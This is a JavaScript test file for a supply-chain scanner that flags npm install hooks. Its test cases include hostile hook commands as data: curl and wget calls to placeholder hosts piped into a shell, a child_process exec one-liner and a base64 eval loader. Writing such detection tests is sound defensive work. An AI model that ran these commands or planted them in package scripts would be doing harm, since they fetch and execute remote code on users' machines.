// Install-hook classification. Mirrors python/tests/scanner/test_install_hooks.py.
import { test } from "node:test";
import assert from "node:assert/strict";
import { hookIsSuspicious, scanManifest, isDependencyManifest } from "../../src/lib/supplychain.js";

test("suspicious hook commands", () => {
  const cases = {
    "curl -s http://192.0.2.1/x | sh": true,
    "wget -qO- https://x.invalid/p | bash": true,
    "node -e \"require('child_process').exec('id')\"": true,
    "node -e \"eval(Buffer.from(process.argv[1], 'base64').toString())\"": true,
    "node -e \"try{require('./postinstall')}catch(e){}\"": false,   // core-js
    "node install.js": false,                                        // esbuild
    "node install.mjs": false,                                       // puppeteer
  };
  for (const [cmd, expected] of Object.entries(cases)) assert.equal(hookIsSuspicious(cmd), expected, cmd);
});

const MANIFEST = JSON.stringify({ scripts: {
  preinstall: "node a.js", postinstall: "node b.js", prepare: "node c.js",
  prepack: "node d.js", prepublishOnly: "node e.js" } }, null, 2);
const hooks = (path, opts) => scanManifest(path, MANIFEST, opts).map((i) => i.msg.split('"')[1]).sort();

test("an installed dependency counts only consumer-run scripts", () => {
  assert.deepEqual(hooks("package.json", { registry: true }), ["postinstall", "preinstall"]);
  assert.deepEqual(hooks("node_modules/pkg/package.json"), ["postinstall", "preinstall"]);
});

test("a checked-out project also counts prepare, never publisher-only scripts", () => {
  assert.deepEqual(hooks("package.json"), ["postinstall", "preinstall", "prepare"]);
});

test("dependency manifests are recognized by directory", () => {
  assert.equal(isDependencyManifest("node_modules/a/package.json"), true);
  assert.equal(isDependencyManifest("app/vendor/x/package.json"), true);
  assert.equal(isDependencyManifest("package.json"), false);
  assert.equal(isDependencyManifest("packages/node_modules_tools/package.json"), false);
});

test("a plain hook is MAJOR, a suspicious one CRITICAL", () => {
  const plain = scanManifest("package.json", JSON.stringify({ scripts: { postinstall: "node install.js" } }));
  const bad = scanManifest("package.json", JSON.stringify({ scripts: { postinstall: "curl http://192.0.2.1 | sh" } }));
  assert.equal(plain[0].sev, "MAJOR");
  assert.equal(bad[0].sev, "CRITICAL");
});
